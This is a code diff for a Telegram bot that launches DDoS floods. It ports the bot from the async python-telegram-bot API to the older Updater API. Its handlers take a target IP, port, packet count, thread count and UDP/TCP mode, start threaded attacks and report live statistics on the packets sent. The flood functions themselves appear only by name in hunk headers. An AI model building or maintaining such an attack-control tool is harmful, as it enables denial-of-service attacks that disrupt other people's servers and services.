@@ -8,8 +8,9 @@ import logging
 from datetime import datetime
 from flask import Flask, jsonify, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, ApplicationBuilder
-import asyncio
+from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler
+import warnings
+warnings.filterwarnings('ignore')
 
 # Disable logging for cleaner output
 logging.basicConfig(level=logging.ERROR)
@@ -256,23 +257,25 @@ def format_uptime(seconds):
         return f"{days}d {hours}h"
 
 # Telegram Bot Functions
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def start(update: Update, context: CallbackContext):
     """Send a message when /start is issued."""
-    await update.message.reply_text(START_TEXT)
+    update.message.reply_text(START_TEXT)
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def help_command(update: Update, context: CallbackContext):
     """Send a help message."""
-    await update.message.reply_text(HELP_TEXT)
+    update.message.reply_text(HELP_TEXT)
 
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def status_command(update: Update, context: CallbackContext):
     """Check status of active attacks."""
     if not active_attacks:
-        await update.message.reply_text("No active attacks running.")
+        update.message.reply_text("No active attacks running.")
         return
     
     status_msg = "ACTIVE ATTACKS:\n\n"
+    has_attacks = False
     for attack_id, info in active_attacks.items():
         if info.get('running', False):
+            has_attacks = True
             status_msg += f"ID: {attack_id}\n"
             status_msg += f"   Target: {info['ip']}:{info['port']}\n"
             status_msg += f"   Mode: {info['mode'].upper()}\n"
@@ -280,15 +283,15 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             status_msg += f"   Packets Sent: {info.get('packets_sent', 0):,}\n"
             status_msg += f"   Status: RUNNING\n\n"
     
-    if status_msg == "ACTIVE ATTACKS:\n\n":
-        await update.message.reply_text("No active attacks running.")
+    if has_attacks:
+        update.message.reply_text(status_msg)
     else:
-        await update.message.reply_text(status_msg)
+        update.message.reply_text("No active attacks running.")
 
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def stats_command(update: Update, context: CallbackContext):
     """Show live attack statistics."""
     if not active_attacks:
-        await update.message.reply_text("No active attacks to show statistics.")
+        update.message.reply_text("No active attacks to show statistics.")
         return
     
     stats_msg = "LIVE ATTACK STATISTICS\n"
@@ -309,16 +312,16 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats_msg += "-" * 30 + "\n"
     
     if has_attacks:
-        await update.message.reply_text(stats_msg)
+        update.message.reply_text(stats_msg)
     else:
-        await update.message.reply_text("No active attacks to show statistics.")
+        update.message.reply_text("No active attacks to show statistics.")
 
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def stop_command(update: Update, context: CallbackContext):
     """Stop all active attacks."""
     global active_attacks, attack_threads, attack_stats, stats_threads
     
     if not active_attacks:
-        await update.message.reply_text("No active attacks to stop.")
+        update.message.reply_text("No active attacks to stop.")
         return
     
     stopped_count = 0
@@ -340,7 +343,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         del active_attacks[attack_id]
         stopped_count += 1
     
-    await update.message.reply_text(f"Stopped {stopped_count} attack(s).")
+    update.message.reply_text(f"Stopped {stopped_count} attack(s).")
 
 # UDP Attack functions
 def attack_udp_1(ip, port, times, attack_id):
@@ -558,12 +561,12 @@ def start_attack(ip, port, times, threads, attack_id, mode):
     
     start_stats_thread(attack_id)
 
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def attack_command(update: Update, context: CallbackContext):
     """Handle /attack command"""
     args = context.args
     
     if len(args) < 4:
-        await update.message.reply_text(
+        update.message.reply_text(
             "Invalid usage!\n\n"
             "Format: /attack [IP] [PORT] [PACKETS] [THREADS] [MODE]\n"
             "MODE: udp, tcp, both (default: both)\n"
@@ -585,27 +588,27 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if len(args) >= 5:
             mode = args[4].lower()
             if mode not in ['udp', 'tcp', 'both']:
-                await update.message.reply_text("Invalid mode! Choose: udp, tcp, or both")
+                update.message.reply_text("Invalid mode! Choose: udp, tcp, or both")
                 return
         
         if times < 100 or times > 5000:
-            await update.message.reply_text("Packets must be between 100-5000")
+            update.message.reply_text("Packets must be between 100-5000")
             return
         if threads < 100 or threads > 5000:
-            await update.message.reply_text("Threads must be between 100-5000")
+            update.message.reply_text("Threads must be between 100-5000")
             return
         if port < 1 or port > 65535:
-            await update.message.reply_text("Invalid port number (1-65535)")
+            update.message.reply_text("Invalid port number (1-65535)")
             return
             
     except ValueError:
-        await update.message.reply_text("Invalid input! Please use numbers for port, packets, and threads.")
+        update.message.reply_text("Invalid input! Please use numbers for port, packets, and threads.")
         return
     
     attack_id = f"{ip}:{port}:{mode}"
     
     if attack_id in active_attacks and active_attacks[attack_id].get('running', False):
-        await update.message.reply_text(f"Attack on {attack_id} is already running!")
+        update.message.reply_text(f"Attack on {attack_id} is already running!")
         return
     
     confirm_msg = (
@@ -627,17 +630,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await update.message.reply_text(confirm_msg, reply_markup=reply_markup)
+    update.message.reply_text(confirm_msg, reply_markup=reply_markup)
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def button_callback(update: Update, context: CallbackContext):
     """Handle button callbacks"""
     query = update.callback_query
-    await query.answer()
+    query.answer()
     
     data = query.data
     
     if data == "cancel":
-        await query.edit_message_text("Attack cancelled.")
+        query.edit_message_text("Attack cancelled.")
         return
     
     if data.startswith("confirm_"):
@@ -659,7 +662,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             mode = 'both'
             attack_id = f"{ip}:{port}:{mode}"
         
-        await query.edit_message_text(
+        query.edit_message_text(
             f"Attack Started!\n\n"
             f"Target: {ip}\n"
             f"Port: {port}\n"
@@ -673,31 +676,39 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         start_attack(ip, port, times, threads, attack_id, mode)
         
-        await context.bot.send_message(
+        context.bot.send_message(
             chat_id=query.message.chat_id,
             text=f"Attack on {attack_id} has been launched with {threads} threads in {mode.upper()} mode!"
         )
 
+def error_handler(update, context):
+    """Log errors caused by updates."""
+    print(f"Update {update} caused error {context.error}")
+
 def run_bot():
     """Run the Telegram bot"""
     try:
-        # Create the Application
-        application = Application.builder().token(BOT_TOKEN).build()
+        # Create the Updater
+        updater = Updater(token=BOT_TOKEN, use_context=True)
+        dp = updater.dispatcher
         
         # Add command handlers
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("status", status_command))
-        application.add_handler(CommandHandler("stats", stats_command))
-        application.add_handler(CommandHandler("stop", stop_command))
-        application.add_handler(CommandHandler("attack", attack_command))
-        application.add_handler(CallbackQueryHandler(button_callback))
+        dp.add_handler(CommandHandler("start", start))
+        dp.add_handler(CommandHandler("help", help_command))
+        dp.add_handler(CommandHandler("status", status_command))
+        dp.add_handler(CommandHandler("stats", stats_command))
+        dp.add_handler(CommandHandler("stop", stop_command))
+        dp.add_handler(CommandHandler("attack", attack_command))
+        dp.add_handler(CallbackQueryHandler(button_callback))
+        dp.add_error_handler(error_handler)
         
         # Start the bot
         print("Bot is polling for updates...")
-        application.run_polling(allowed_updates=Update.ALL_TYPES)
+        updater.start_polling()
+        updater.idle()
     except Exception as e:
         print(f"Bot error: {e}")
+        time.sleep(5)
 
 def run_flask():
     """Run Flask server"""
